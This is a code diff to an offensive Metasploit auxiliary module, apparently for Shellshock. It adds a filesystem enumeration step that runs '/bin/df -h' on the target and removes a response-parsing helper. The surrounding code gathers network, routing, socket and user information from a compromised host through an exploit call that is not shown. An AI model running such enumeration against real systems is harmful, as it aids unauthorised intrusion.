@@ -68,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
 
         print_good("    Users:\n" + passwd + "\n")
     end
-        def enum_network(uri)
+    def enum_network(uri)
         print("\n")
         print_status("Enumerating Network Information")
         ifconfig = exploit(uri, "/sbin/ifconfig")
@@ -81,16 +81,13 @@ class Metasploit3 < Msf::Auxiliary
         print_good("    Routing Table:\n" + route + "\n")
         print_good("    Sockets: \n" + netstat + "\n")
      end
-
-     def parse(a)
-         res_str = a.to_s
-         re = Regexp.new "shellshock-resp:\r\n.*\r\n"
-         search = res_str.split("\r\n\r\n")
-         searchgrep = search.grep(/-resp:/)
-         searchsplit = searchgrep[0].split(":\r\n")
-         results = searchsplit[1].to_s.strip
-         return results
-     end
+     def enum_fs(uri)
+         print("\n")
+         print_status("Enumerating Fileystem Information")
+         df = exploit(uri, "/bin/df -h")
+         
+         print_good("  DF:\n" + df +"\n")
+    end
 
      def run
          uri = target_uri.path
@@ -98,6 +95,7 @@ class Metasploit3 < Msf::Auxiliary
          enum_sysinfo(uri)
          enum_users(uri)
          enum_network(uri)
+         enum_fs(uri)
 
      end
 end
